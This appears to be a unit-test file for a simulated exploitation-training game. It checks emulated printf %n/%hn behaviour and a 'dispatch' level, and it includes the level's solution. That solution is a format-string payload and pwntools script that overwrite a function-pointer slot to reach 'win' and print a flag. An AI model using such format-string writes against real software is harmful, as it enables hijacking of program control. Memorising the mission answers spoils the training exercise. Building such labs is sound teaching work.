import unittest

from omnisploit.engine.machine import load_all_levels, Process
from omnisploit.engine.world import World
from omnisploit.shell.shell import Shell

TABLE_OFFSET = 613


def run(sh, line):
    out = sh.run_line(line)
    o = b"".join(d for d, e in out.chunks if not e)
    e = b"".join(d for d, e in out.chunks if e)
    return o, e


class FormatWriteEngineTests(unittest.TestCase):
    """%n/%hn against the raw engine."""

    def setUp(self):
        lv = load_all_levels()["motd-daemon"]
        self.cpu_level = lv

    def make_cpu(self):
        from omnisploit.engine.cpu import Cpu

        return Cpu(self.cpu_level, b"")

    def test_n_writes_the_output_length_so_far(self):
        cpu = self.make_cpu()
        target = cpu.base + 0x50
        cpu.regs["rsi"] = target
        text = cpu._printf_format(b"AAAA%n", cpu.base + 0x100)
        self.assertEqual(text, b"AAAA")
        self.assertEqual(cpu.read(target, 4), (4).to_bytes(4, "little"))

    def test_hn_writes_only_two_bytes(self):
        cpu = self.make_cpu()
        target = cpu.base + 0x50
        cpu.write(target, (0xFFFFFFFF).to_bytes(4, "little"))
        cpu.regs["rsi"] = target
        cpu._printf_format(b"A" * 10 + b"%hn", cpu.base + 0x100)
        self.assertEqual(cpu.read(target, 4), (0x0A & 0xFFFF).to_bytes(2, "little") + b"\xff\xff")

    def test_width_specifier_pads_output_without_a_long_input(self):
        cpu = self.make_cpu()
        target = cpu.base + 0x50
        cpu.regs["rsi"] = 7  # %1$d just prints it, padded to the given width
        text = cpu._printf_format(b"%100d%1$x", cpu.base + 0x100)
        self.assertEqual(len(text), 101)  # the %100d field is exactly 100 wide, plus one hex digit from %1$x
        cpu.regs["rsi"] = target
        text2 = cpu._printf_format(b"%100d%1$n", cpu.base + 0x100)
        self.assertEqual(int.from_bytes(cpu.read(target, 4), "little"), len(text2))

    def test_write_to_an_unmapped_address_faults(self):
        cpu = self.make_cpu()
        cpu.regs["rsi"] = 0xDEADBEEF
        self.assertIsNone(cpu._printf_format(b"AAAA%n", cpu.base + 0x100))

    def test_bare_percent_n_is_parsed_not_left_literal(self):
        cpu = self.make_cpu()
        cpu.regs["rsi"] = cpu.base + 0x60
        text = cpu._printf_format(b"x%n", cpu.base + 0x100)
        self.assertEqual(text, b"x")


class DispatchLevelTests(unittest.TestCase):
    def setUp(self):
        self.sh = Shell(World())
        run(self.sh, "cd dispatch")
        self.lv = load_all_levels()["dispatch"]
        self.win = self.lv.function("win").addr
        self.pad = self.win & 0xFFFF

    def exploit_payload(self):
        return f"%{self.pad}d%{TABLE_OFFSET}$hn\n".encode()

    def test_plain_input_is_echoed_unharmed(self):
        res = Process(self.lv).feed(b"hello\n")
        self.assertIn(b"hello", res.stdout)
        self.assertIsNone(res.crash)
        self.assertFalse(res.solved)

    def test_a_long_literal_payload_overflows_the_huge_buffer_eventually_but_plain_probing_does_not(self):
        res = Process(self.lv).feed(b"%x.%x.%x.%x\n")
        self.assertIsNone(res.crash)
        self.assertNotIn(b"FLAG", res.stdout)

    def test_table_offset_is_discoverable_via_x_scan(self):
        res = Process(self.lv).feed(f"%{TABLE_OFFSET}$lx\n".encode())
        self.assertTrue(res.stdout.startswith(b"7fffffffdfd0"))  # the table slot's own stack address

    def test_exploit_redirects_the_call_and_prints_the_flag(self):
        res = Process(self.lv).feed(self.exploit_payload())
        self.assertTrue(res.solved)
        self.assertIn(b"FLAG{the_table_pointed_somewhere_else}", res.stdout)
        self.assertIsNone(res.crash)

    def test_wrong_offset_does_not_solve_it(self):
        res = Process(self.lv).feed(f"%{self.pad}d%999$hn\n".encode())
        self.assertFalse(res.solved)

    def test_checksec_reports_no_canary(self):
        o, _ = run(self.sh, "checksec ./dispatch")
        self.assertIn(b"No canary found", o)

    def test_r2_shows_the_indirect_call(self):
        run(self.sh, "r2 -A ./dispatch")
        o, _ = run(self.sh, "pdf @ main")
        text = o.decode()
        self.assertIn("call qword [rbp-0x10]", text)
        self.assertIn("mov qword [rbp-0x10], 0x401050", text)
        run(self.sh, "q")

    def test_gdb_can_watch_the_table_slot_get_overwritten(self):
        run(self.sh, "gdb -q ./dispatch")
        run(self.sh, "watch *0x7fffffffdfd0")
        self.sh.vfs.install("/tmp/payload", self.exploit_payload())
        run(self.sh, "run < /tmp/payload")  # first hit: the table's own startup initialization
        o, _ = run(self.sh, "c")  # second hit: the exploit's overwrite
        self.assertIn(b"Old value = 0x401050", o)
        self.assertIn(b"New value = 0x401176", o)
        run(self.sh, "c")
        run(self.sh, "q")

    def test_pwn_process_exploit_script(self):
        src = (
            "from pwn import *\n"
            "context.arch = 'amd64'\n"
            "p = process('./dispatch')\n"
            f"p.sendline(b'%{self.pad}d%{TABLE_OFFSET}$hn')\n"
            "out = p.recvall()\n"
            "print(b'FLAG{' in out)\n"
        )
        self.sh.vfs.install("/tmp/e.py", src)
        o, _ = run(self.sh, "python3 /tmp/e.py")
        self.assertEqual(o, b"True\n")


class DispatchMissionTests(unittest.TestCase):
    def setUp(self):
        self.sh = Shell(World())
        run(self.sh, "mkdir ~/workspace")
        lv = load_all_levels()["dispatch"]
        win = lv.function("win").addr
        self.pad = win & 0xFFFF

    def completed(self):
        self.sh.world.missions.evaluate()
        return list(self.sh.world.missions.completed)

    def exploit(self):
        src = (
            "from pwn import *\n"
            "context.arch = 'amd64'\n"
            "p = process('./dispatch')\n"
            f"p.sendline(b'%{self.pad}d%{TABLE_OFFSET}$hn')\n"
            "p.recvall()\n"
        )
        self.sh.vfs.install("/tmp/e.py", src)
        run(self.sh, "cd ~/dispatch")
        run(self.sh, "python3 /tmp/e.py")

    def test_requires_both_steps(self):
        self.assertEqual(self.completed(), [])
        run(self.sh, f"echo {TABLE_OFFSET} > ~/workspace/table-offset.txt")
        self.assertEqual(self.completed(), [])
        self.exploit()
        self.assertEqual(self.completed(), ["dispatch"])

    def test_wrong_offset_recorded_does_not_complete_it(self):
        run(self.sh, "echo 42 > ~/workspace/table-offset.txt")
        self.exploit()
        self.assertEqual(self.completed(), [])

    def test_solving_without_recording_the_offset_is_not_enough(self):
        self.exploit()
        self.assertEqual(self.completed(), [])
